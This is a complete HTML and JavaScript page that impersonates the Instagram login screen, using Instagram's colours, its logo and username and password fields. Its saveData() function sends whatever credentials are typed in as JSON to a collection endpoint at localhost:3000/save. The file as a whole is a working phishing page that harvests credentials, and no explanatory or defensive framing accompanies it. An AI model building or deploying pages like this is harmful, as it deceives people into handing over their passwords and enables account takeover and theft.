<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 20px;
            border: 1px solid #ddd;
            width: 100%;
            max-width: 350px;
        }
        .logo {
            width: 50%;
            max-width: 180px;
            margin-bottom: 20px;
        }
        .input-box {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .login-btn {
            width: 100%;
            background: #3897f0;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-btn:hover {
            background: #3178c6;
        }
        .forgot {
            display: block;
            margin-top: 10px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }
        @media (max-width: 400px) {
            .container {
                padding: 15px;
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        <input type="text" id="username" class="input-box" placeholder="Username or Email">
        <input type="password" id="password" class="input-box" placeholder="Password">
        <button class="login-btn" onclick="saveData()">Log In</button>
        <a href="#" class="forgot">Forgot password?</a>
    </div>
    
    <script>
        function saveData() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            fetch("http://localhost:3000/save", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.text())
            .then(data => alert(data))
            .catch(error => console.error("Error:", error));
        }
    </script>
</body>
</html>
